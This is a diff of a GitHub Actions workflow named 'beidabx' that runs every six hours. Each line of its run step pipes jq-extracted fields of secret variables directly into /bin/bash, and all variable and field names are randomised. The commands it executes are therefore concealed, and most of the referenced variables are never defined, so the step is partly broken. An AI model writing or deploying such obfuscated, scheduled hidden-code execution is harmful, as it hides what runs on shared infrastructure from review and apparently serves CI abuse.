@@ -1,28 +1,25 @@
 name: beidabx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
+    - cron: '34 2/6 * * *'
 
-jobs:  # 17418
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: beidabx
         env:
-          kwc4: ${{ secrets.kwc4 }}
+          yrr66795: ${{ secrets.yrr66795 }}
         run: |
-          echo $kwc4 | jq -r .ssmij654 | /bin/bash
-          echo $suc606 | jq -r .hici8786 | /bin/bash
-          echo $ioni0575 | jq -r .wfhks3 | /bin/bash
-          echo $qtqvv4391 | jq -r .icuc63 | /bin/bash
-          echo $kjfen752 | jq -r .fek6 | /bin/bash
-          echo $auk7401 | jq -r .g9099 | /bin/bash
-          echo $yr638 | jq -r .axx2 | /bin/bash
-          echo $k51 | jq -r .hfa0 | /bin/bash
-          echo $ej228 | jq -r .hdhv33 | /bin/bash
-          echo $lnzgr5 | jq -r .hyonm144 | /bin/bash
-          echo $b2535 | jq -r .ori7559 | /bin/bash
+          echo $yrr66795 | jq -r .uv685 | /bin/bash
+          echo $i92 | jq -r .wm6195 | /bin/bash
+          echo $sqx1 | jq -r .ymbc93 | /bin/bash
+          echo $pgxjm97072 | jq -r .qqgl00207 | /bin/bash
+          echo $cw2 | jq -r .cw82188 | /bin/bash
+          echo $egaj1490 | jq -r .uh55103 | /bin/bash
+          echo $phff745 | jq -r .huu67689 | /bin/bash
+          echo $c41 | jq -r .wu4 | /bin/bash
 
